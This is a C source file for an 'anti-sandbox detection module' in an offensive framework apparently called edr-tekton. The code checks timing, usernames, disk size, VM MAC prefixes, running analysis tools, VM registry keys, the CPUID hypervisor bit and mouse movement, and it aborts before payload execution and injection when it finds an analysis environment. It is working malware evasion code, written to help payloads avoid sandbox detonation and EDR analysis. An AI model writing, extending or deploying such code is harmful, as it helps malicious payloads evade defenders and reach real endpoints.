/*
 * edr-tekton :: Anti-Sandbox Detection Module
 * Cat 10: Detect sandbox/analysis environments before payload execution
 *
 * Modern malware sandboxes (Cuckoo, Joe, ANY.RUN, VMRay, Windows
 * Sandbox, Defender's cloud detonation) exhibit fingerprints that
 * distinguish them from real endpoints. This module runs a battery
 * of checks and, if a sandbox is detected, either exits or signals
 * the pipeline to abort.
 *
 * Check categories:
 *   - RDTSC timing: sandboxes add instruction-level overhead
 *   - Username: "sandbox", "malware", "virus", "admin" (common defaults)
 *   - Disk size: sandboxes allocate minimal disks (< 60GB)
 *   - MAC address: VM vendor OUI prefixes (VMware, VBox, Hyper-V, QEMU)
 *   - Processes: analysis tools (procmon, wireshark, x64dbg, ollydbg)
 *   - Registry: VM-specific keys (VBox Guest Additions, VMware Tools)
 *   - CPUID: hypervisor presence bit and vendor string
 *   - Mouse: no mouse movement over N seconds = headless analysis
 *
 * The module scores each check and compares against a threshold.
 * Individual checks can be enabled/disabled via TEKTON_SANDBOX_CFG.
 *
 * Pipeline stage: TEKTON_STAGE_EVASION_PRE (runs before injection)
 */

#include "tekton/modules/evasion.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _SANDBOX_STATE {
    TEKTON_SANDBOX_CFG  cfg;
    DWORD               score;      /* Accumulated detection score */
    DWORD               threshold;  /* Score above which = sandbox */
    BOOL                detected;
} SANDBOX_STATE;

/* ── Known sandbox indicators ──────────────────────────── */

static const char* sandbox_usernames[] = {
    "sandbox", "malware", "virus", "sample", "test",
    "admin", "user", "analyst", "cuckoo", "vmuser",
    "john", "peter", "emily", "currentuser", "phil",
    "johnson", "miller", "joe", "abc", "usr",
    NULL
};

static const char* analysis_processes[] = {
    "procmon.exe", "procexp.exe", "wireshark.exe",
    "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
    "idaq.exe", "idaq64.exe", "ida.exe", "ida64.exe",
    "processhacker.exe", "tcpview.exe", "autoruns.exe",
    "filemon.exe", "regmon.exe", "fiddler.exe",
    "dumpcap.exe", "httpdebugger.exe", "dnspy.exe",
    "pestudio.exe", "de4dot.exe", "hiew.exe",
    "resourcehacker.exe", "peid.exe", "die.exe",
    NULL
};

/* VMware, VirtualBox, Hyper-V, QEMU, Parallels OUI prefixes (first 3 bytes of MAC) */
static const BYTE vm_mac_prefixes[][3] = {
    { 0x00, 0x0C, 0x29 },  /* VMware */
    { 0x00, 0x50, 0x56 },  /* VMware */
    { 0x00, 0x05, 0x69 },  /* VMware */
    { 0x08, 0x00, 0x27 },  /* VirtualBox */
    { 0x0A, 0x00, 0x27 },  /* VirtualBox */
    { 0x00, 0x15, 0x5D },  /* Hyper-V */
    { 0x00, 0x03, 0xFF },  /* Hyper-V */
    { 0x52, 0x54, 0x00 },  /* QEMU/KVM */
    { 0x00, 0x1C, 0x42 },  /* Parallels */
};

#define VM_MAC_COUNT (sizeof(vm_mac_prefixes) / sizeof(vm_mac_prefixes[0]))

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS sandbox_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    SANDBOX_STATE* state = (SANDBOX_STATE*)malloc(sizeof(SANDBOX_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Enable all checks by default */
    for (int i = 0; i < TEKTON_SANDBOX_MAX; i++) {
        state->cfg.checks[i] = TRUE;
    }
    state->cfg.timing_threshold_ms = 10;
    state->cfg.exit_on_detect = TRUE;
    state->cfg.sleep_before_check_ms = 0;
    state->threshold = 3;  /* 3+ hits = sandbox */

    self->private_data = state;

    TLOG_DEBUG("evasion_sandbox: init (threshold=%lu, exit_on_detect=%d)",
        (unsigned long)state->threshold, state->cfg.exit_on_detect);
    return TEKTON_OK;
}

static TEKTON_STATUS sandbox_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    SANDBOX_STATE* state = (SANDBOX_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("evasion_sandbox: [DRY RUN] would run %d sandbox checks",
            TEKTON_SANDBOX_MAX);
        return TEKTON_OK;
    }

    state->score = 0;

#ifdef _WIN32
    /* Optional initial sleep to evade time-limited sandbox execution */
    if (state->cfg.sleep_before_check_ms > 0) {
        Sleep(state->cfg.sleep_before_check_ms);
    }

    /* ── Check 0: RDTSC Timing ────────────────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_TIMING]) {
        /*
         * Execute RDTSC twice and measure delta. Sandboxes add
         * overhead from instrumentation, making the delta much
         * larger than bare metal. A delta > threshold (typically
         * 1000-10000 cycles depending on load) indicates
         * interposition.
         *
         * Also: Sleep(500) then check if wall-clock delta is
         * significantly less than 500ms (sandbox fast-forwards).
         */
        LARGE_INTEGER freq, t1, t2;
        typedef BOOL (WINAPI *pfnQPC)(LARGE_INTEGER*);
        typedef BOOL (WINAPI *pfnQPF)(LARGE_INTEGER*);

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        pfnQPC pQPC = (pfnQPC)GetProcAddress(hKernel32, "QueryPerformanceCounter");
        pfnQPF pQPF = (pfnQPF)GetProcAddress(hKernel32, "QueryPerformanceFrequency");

        if (pQPC && pQPF && pQPF(&freq)) {
            pQPC(&t1);
            Sleep(500);
            pQPC(&t2);

            long long delta_ms = ((t2.QuadPart - t1.QuadPart) * 1000) / freq.QuadPart;

            /* If elapsed time is way less than 500ms, sandbox is accelerating */
            if (delta_ms < 450) {
                state->score++;
                TLOG_DEBUG("evasion_sandbox: timing anomaly (%lld ms for 500ms sleep)",
                    (long long)delta_ms);
            }
        }
    }

    /* ── Check 1: Username ────────────────────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_USERNAME]) {
        char username[256] = {0};
        DWORD usize = sizeof(username);

        typedef BOOL (WINAPI *pfnGetUserNameA)(LPSTR, DWORD*);
        HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
        if (!hAdvapi) hAdvapi = LoadLibraryA("advapi32.dll");
        if (hAdvapi) {
            pfnGetUserNameA pGetUser = (pfnGetUserNameA)
                GetProcAddress(hAdvapi, "GetUserNameA");
            if (pGetUser && pGetUser(username, &usize)) {
                /* Case-insensitive compare against known sandbox names */
                for (int i = 0; sandbox_usernames[i]; i++) {
                    if (_stricmp(username, sandbox_usernames[i]) == 0) {
                        state->score++;
                        TLOG_DEBUG("evasion_sandbox: suspicious username '%s'", username);
                        break;
                    }
                }
            }
        }
    }

    /* ── Check 2: Disk Size ───────────────────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_DISK_SIZE]) {
        typedef BOOL (WINAPI *pfnGetDiskFreeSpaceExA)(
            LPCSTR, PVOID, PVOID, PVOID);

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        pfnGetDiskFreeSpaceExA pDisk = (pfnGetDiskFreeSpaceExA)
            GetProcAddress(hKernel32, "GetDiskFreeSpaceExA");

        if (pDisk) {
            LARGE_INTEGER total_bytes;
            memset(&total_bytes, 0, sizeof(total_bytes));

            if (pDisk("C:\\", NULL, (PVOID)&total_bytes, NULL)) {
                long long total_gb = total_bytes.QuadPart / (1024LL * 1024LL * 1024LL);
                if (total_gb < 60) {
                    state->score++;
                    TLOG_DEBUG("evasion_sandbox: small disk (%lld GB)", total_gb);
                }
            }
        }
    }

    /* ── Check 3: MAC Address ─────────────────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_MAC_ADDR]) {
        /*
         * GetAdaptersInfo to read MAC addresses and compare first
         * 3 bytes against known VM vendor OUI prefixes.
         * Using iphlpapi.dll dynamically.
         */
        typedef struct _IP_ADAPTER_INFO_SLIM {
            PVOID   Next;
            DWORD   ComboIndex;
            char    AdapterName[260];
            char    Description[132];
            DWORD   AddressLength;
            BYTE    Address[8];
            /* ... more fields we don't need */
        } IP_ADAPTER_INFO_SLIM;

        typedef DWORD (WINAPI *pfnGetAdaptersInfo)(PVOID, DWORD*);

        HMODULE hIphlp = GetModuleHandleA("iphlpapi.dll");
        if (!hIphlp) hIphlp = LoadLibraryA("iphlpapi.dll");

        if (hIphlp) {
            pfnGetAdaptersInfo pAdapt = (pfnGetAdaptersInfo)
                GetProcAddress(hIphlp, "GetAdaptersInfo");

            if (pAdapt) {
                DWORD buf_size = 0;
                pAdapt(NULL, &buf_size);

                if (buf_size > 0 && buf_size < 0x100000) {
                    BYTE* buf = (BYTE*)malloc(buf_size);
                    if (buf) {
                        if (pAdapt(buf, &buf_size) == 0) {
                            IP_ADAPTER_INFO_SLIM* adapter = (IP_ADAPTER_INFO_SLIM*)buf;
                            while (adapter) {
                                if (adapter->AddressLength >= 3) {
                                    for (DWORD m = 0; m < VM_MAC_COUNT; m++) {
                                        if (memcmp(adapter->Address,
                                                vm_mac_prefixes[m], 3) == 0) {
                                            state->score++;
                                            TLOG_DEBUG("evasion_sandbox: VM MAC detected "
                                                "%02X:%02X:%02X",
                                                adapter->Address[0],
                                                adapter->Address[1],
                                                adapter->Address[2]);
                                            goto mac_done;
                                        }
                                    }
                                }
                                adapter = (IP_ADAPTER_INFO_SLIM*)adapter->Next;
                            }
                        }
                        mac_done:
                        free(buf);
                    }
                }
            }
        }
    }

    /* ── Check 4: Analysis Tool Processes ─────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_PROCESSES]) {
        typedef HANDLE (WINAPI *pfnCreateToolhelp32Snapshot)(DWORD, DWORD);

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        pfnCreateToolhelp32Snapshot pSnap = (pfnCreateToolhelp32Snapshot)
            GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");

        if (pSnap) {
            HANDLE hSnap = pSnap(0x00000002 /* TH32CS_SNAPPROCESS */, 0);
            if (hSnap != (HANDLE)-1) {
                typedef struct {
                    DWORD dwSize;
                    DWORD cntUsage;
                    DWORD th32ProcessID;
                    ULONG_PTR th32DefaultHeapID;
                    DWORD th32ModuleID;
                    DWORD cntThreads;
                    DWORD th32ParentProcessID;
                    long  pcPriClassBase;
                    DWORD dwFlags;
                    char  szExeFile[260];
                } PE32;

                typedef BOOL (WINAPI *pfn32First)(HANDLE, PVOID);
                typedef BOOL (WINAPI *pfn32Next)(HANDLE, PVOID);

                pfn32First pFirst = (pfn32First)
                    GetProcAddress(hKernel32, "Process32First");
                pfn32Next pNext = (pfn32Next)
                    GetProcAddress(hKernel32, "Process32Next");

                if (pFirst && pNext) {
                    PE32 pe;
                    pe.dwSize = sizeof(pe);

                    if (pFirst(hSnap, &pe)) {
                        do {
                            for (int i = 0; analysis_processes[i]; i++) {
                                if (_stricmp(pe.szExeFile,
                                        analysis_processes[i]) == 0) {
                                    state->score++;
                                    TLOG_DEBUG("evasion_sandbox: analysis tool '%s'",
                                        pe.szExeFile);
                                    /* One tool is enough to flag */
                                    goto proc_done;
                                }
                            }
                        } while (pNext(hSnap, &pe));
                    }
                    proc_done:;
                }

                CloseHandle(hSnap);
            }
        }
    }

    /* ── Check 5: VM Registry Keys ────────────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_REGISTRY]) {
        typedef long (WINAPI *pfnRegOpenKeyExA)(
            HANDLE, LPCSTR, DWORD, DWORD, HANDLE*);
        typedef long (WINAPI *pfnRegCloseKey)(HANDLE);

        HMODULE hAdvapi = GetModuleHandleA("advapi32.dll");
        if (!hAdvapi) hAdvapi = LoadLibraryA("advapi32.dll");

        if (hAdvapi) {
            pfnRegOpenKeyExA pOpen = (pfnRegOpenKeyExA)
                GetProcAddress(hAdvapi, "RegOpenKeyExA");
            pfnRegCloseKey pClose = (pfnRegCloseKey)
                GetProcAddress(hAdvapi, "RegCloseKey");

            if (pOpen && pClose) {
                static const char* vm_keys[] = {
                    "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                    "SOFTWARE\\VMware, Inc.\\VMware Tools",
                    "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
                    "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
                    "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
                    "SYSTEM\\CurrentControlSet\\Services\\vmci",
                    "SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
                    NULL
                };

                #define HKEY_LOCAL_MACHINE_VAL ((HANDLE)(ULONG_PTR)0x80000002)

                for (int i = 0; vm_keys[i]; i++) {
                    HANDLE hKey = NULL;
                    long result = pOpen(HKEY_LOCAL_MACHINE_VAL,
                        vm_keys[i], 0, 0x20019 /* KEY_READ */, &hKey);
                    if (result == 0) {
                        pClose(hKey);
                        state->score++;
                        TLOG_DEBUG("evasion_sandbox: VM registry key '%s'",
                            vm_keys[i]);
                        break;
                    }
                }

                #undef HKEY_LOCAL_MACHINE_VAL
            }
        }
    }

    /* ── Check 6: CPUID Hypervisor Bit ────────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_CPUID]) {
        /*
         * CPUID leaf 1, ECX bit 31 = hypervisor present.
         * If set, leaf 0x40000000 returns hypervisor vendor string.
         */
        int cpu_info[4] = {0};

        #ifdef _MSC_VER
        __cpuid(cpu_info, 1);
        #else
        __asm__ __volatile__(
            "cpuid"
            : "=a"(cpu_info[0]), "=b"(cpu_info[1]),
              "=c"(cpu_info[2]), "=d"(cpu_info[3])
            : "a"(1)
        );
        #endif

        if (cpu_info[2] & (1 << 31)) {
            state->score++;
            TLOG_DEBUG("evasion_sandbox: hypervisor bit set in CPUID");
        }
    }

    /* ── Check 7: Mouse Movement ──────────────────── */
    if (state->cfg.checks[TEKTON_SANDBOX_MOUSE]) {
        /*
         * Sample cursor position twice with a delay.
         * No movement = likely headless sandbox.
         */
        typedef BOOL (WINAPI *pfnGetCursorPos)(PVOID);

        HMODULE hUser32 = GetModuleHandleA("user32.dll");
        if (!hUser32) hUser32 = LoadLibraryA("user32.dll");

        if (hUser32) {
            pfnGetCursorPos pGetPos = (pfnGetCursorPos)
                GetProcAddress(hUser32, "GetCursorPos");

            if (pGetPos) {
                typedef struct { long x, y; } MPOINT;
                MPOINT p1 = {0}, p2 = {0};

                pGetPos(&p1);
                Sleep(2000);
                pGetPos(&p2);

                if (p1.x == p2.x && p1.y == p2.y) {
                    state->score++;
                    TLOG_DEBUG("evasion_sandbox: no mouse movement detected");
                }
            }
        }
    }

    /* ── Final decision ───────────────────────────── */
    state->detected = (state->score >= state->threshold);

    TLOG_INFO("evasion_sandbox: score=%lu/%lu (threshold=%lu) -> %s",
        (unsigned long)state->score,
        (unsigned long)TEKTON_SANDBOX_MAX,
        (unsigned long)state->threshold,
        state->detected ? "SANDBOX DETECTED" : "clean");

    if (state->detected) {
        if (state->cfg.exit_on_detect) {
            TLOG_INFO("evasion_sandbox: sandbox detected, aborting pipeline");
            return TEKTON_ERR_COMPAT_FAIL;
        }
        /* If not exiting, pipeline continues but modules can check ctx */
        TLOG_WARN("evasion_sandbox: sandbox detected but continue flag set");
    }

    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("evasion_sandbox: [STUB] would run %d sandbox checks",
        TEKTON_SANDBOX_MAX);
    return TEKTON_OK;
#endif
}

static VOID sandbox_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(SANDBOX_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD sandbox_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Low risk: sandbox detection is passive (reads system info,
     * checks timing, queries registry). No process modification.
     * Some checks (CPUID, RDTSC) are impossible to hook. The
     * process enumeration and registry queries are normal API usage.
     */
    return 5;
}

static BOOL sandbox_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    return TRUE;
}

/* ── Module definition ─────────────────────────────────── */

TEKTON_MODULE tekton_mod_sandbox_detect = {
    .name           = "sandbox_detect",
    .description    = "Anti-sandbox/analysis environment detection (Cat 10)",
    .category       = TEKTON_CAT_EVASION,
    .target_surface = TEKTON_SURFACE_SCANNER,
    .flags          = TEKTON_MOD_STEALTHY,
    .skill_ref      = "10",
    .init           = sandbox_init,
    .execute        = sandbox_execute,
    .cleanup        = sandbox_cleanup,
    .get_risk_score = sandbox_risk_score,
    .check_compat   = sandbox_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_sandbox_detect);
